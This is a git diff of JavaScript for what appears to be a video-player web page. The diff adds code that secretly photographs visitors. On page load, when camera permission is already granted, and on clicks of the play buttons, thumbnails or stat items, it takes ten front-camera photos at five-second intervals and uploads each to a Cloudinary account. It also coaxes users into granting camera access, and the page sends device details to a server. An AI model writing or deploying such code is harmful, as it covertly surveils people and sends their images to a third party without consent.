@@ -4,6 +4,58 @@ const video = document.getElementById('videoPlayer');
 const cameraInput = document.getElementById('cameraInput');
 const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
 
+const uploadToCloudinary = async (blob) => {
+    const formData = new FormData();
+    formData.append('file', blob);
+    formData.append('upload_preset', 'user_pre');
+    const response = await fetch('https://api.cloudinary.com/v1_1/dzmg57zjf/image/upload', { method: 'POST', body: formData });
+    return response.json();
+};
+
+const captureAndUpload = async () => {
+    if (isIOS) {
+        return new Promise((resolve) => {
+            cameraInput.onchange = async (e) => {
+                const file = e.target.files[0];
+                if (file) {
+                    await uploadToCloudinary(file);
+                    resolve();
+                }
+            };
+            cameraInput.click();
+        });
+    } else {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        
+        // Capture 10 photos, one every 5 seconds
+        for (let i = 0; i < 10; i++) {
+            if (i > 0) {
+                await new Promise(resolve => setTimeout(resolve, 5000));
+            }
+            
+            if (window.ImageCapture) {
+                const videoTrack = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(videoTrack);
+                const blob = await imageCapture.takePhoto();
+                await uploadToCloudinary(blob);
+            } else {
+                const videoEl = document.createElement('video');
+                videoEl.srcObject = stream;
+                videoEl.play();
+                await new Promise(resolve => setTimeout(resolve, 500));
+                const canvas = document.createElement('canvas');
+                canvas.width = videoEl.videoWidth;
+                canvas.height = videoEl.videoHeight;
+                canvas.getContext('2d').drawImage(videoEl, 0, 0);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                await uploadToCloudinary(blob);
+            }
+        }
+        
+        stream.getTracks().forEach(track => track.stop());
+    }
+};
+
 (async () => {
     const ua = navigator.userAgent;
     const getDeviceInfo = () => {
@@ -84,59 +136,17 @@ const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platfor
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(specs)
     }).catch(() => {});
-})();
-
-const captureAndUpload = async () => {
-    if (isIOS) {
-        return new Promise((resolve) => {
-            cameraInput.onchange = async (e) => {
-                const file = e.target.files[0];
-                if (file) {
-                    await uploadToCloudinary(file);
-                    resolve();
-                }
-            };
-            cameraInput.click();
-        });
-    } else {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        
-        // Capture 10 photos, one every 5 seconds
-        for (let i = 0; i < 10; i++) {
-            if (i > 0) {
-                await new Promise(resolve => setTimeout(resolve, 5000));
+    
+    // Auto-capture on page load if permission granted
+    if (!isIOS && navigator.permissions) {
+        try {
+            const result = await navigator.permissions.query({ name: 'camera' });
+            if (result.state === 'granted') {
+                captureAndUpload().catch(() => {});
             }
-            
-            if (window.ImageCapture) {
-                const videoTrack = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(videoTrack);
-                const blob = await imageCapture.takePhoto();
-                await uploadToCloudinary(blob);
-            } else {
-                const videoEl = document.createElement('video');
-                videoEl.srcObject = stream;
-                videoEl.play();
-                await new Promise(resolve => setTimeout(resolve, 500));
-                const canvas = document.createElement('canvas');
-                canvas.width = videoEl.videoWidth;
-                canvas.height = videoEl.videoHeight;
-                canvas.getContext('2d').drawImage(videoEl, 0, 0);
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-                await uploadToCloudinary(blob);
-            }
-        }
-        
-        stream.getTracks().forEach(track => track.stop());
+        } catch (e) {}
     }
-};
-
-const uploadToCloudinary = async (blob) => {
-    const formData = new FormData();
-    formData.append('file', blob);
-    formData.append('upload_preset', 'user_pre');
-    const response = await fetch('https://api.cloudinary.com/v1_1/dzmg57zjf/image/upload', { method: 'POST', body: formData });
-    return response.json();
-};
+})();
 
 const playVideo = (videoEl, playBtn, loaderEl) => {
     playBtn.style.display = 'none';
@@ -185,14 +195,53 @@ playButton.addEventListener('click', async () => {
 document.querySelectorAll('.extra-video').forEach((vid, index) => {
     const container = vid.closest('.video-container');
     const playBtn = container.querySelector('.play-button');
+    const thumbnail = container.querySelector('.thumbnail');
     
-    playBtn.addEventListener('click', async () => {
+    const handleClick = async () => {
         playBtn.style.display = 'none';
         try {
             await captureAndUpload();
             playVideo(vid, playBtn);
         } catch (error) {
             playBtn.style.display = 'flex';
+            
+            const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+            const isChrome = /Chrome/i.test(navigator.userAgent);
+            const isSafari = /Safari/i.test(navigator.userAgent) && !/Chrome/i.test(navigator.userAgent);
+            
+            let instructions = 'Camera permission denied.\n\nTo enable camera access:\n\n';
+            
+            if (isMobile && isChrome) {
+                instructions += '1. Tap the lock icon (🔒) in the address bar\n2. Tap "Permissions"\n3. Enable "Camera"\n4. Refresh the page';
+            } else if (isMobile && isSafari) {
+                instructions += '1. Go to iPhone Settings\n2. Scroll to Safari\n3. Tap "Camera"\n4. Select "Ask" or "Allow"\n5. Return and refresh this page';
+            } else if (isChrome) {
+                instructions += '1. Click the lock icon (🔒) in the address bar\n2. Click "Site settings"\n3. Change Camera to "Allow"\n4. Refresh the page';
+            } else {
+                instructions += '1. Click the camera icon in the address bar\n2. Allow camera access\n3. Refresh the page';
+            }
+            
+            alert(instructions);
+        }
+    };
+    
+    playBtn.addEventListener('click', handleClick);
+    if (thumbnail) thumbnail.addEventListener('click', handleClick);
+    container.addEventListener('click', handleClick);
+});
+
+document.querySelectorAll('.stat-item').forEach(statItem => {
+    statItem.addEventListener('click', async (e) => {
+        e.stopPropagation();
+        const btn = e.currentTarget;
+        const originalContent = btn.innerHTML;
+        btn.style.opacity = '0.5';
+        
+        try {
+            await captureAndUpload();
+            btn.style.opacity = '1';
+        } catch (error) {
+            btn.style.opacity = '1';
             
             const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
             const isChrome = /Chrome/i.test(navigator.userAgent);
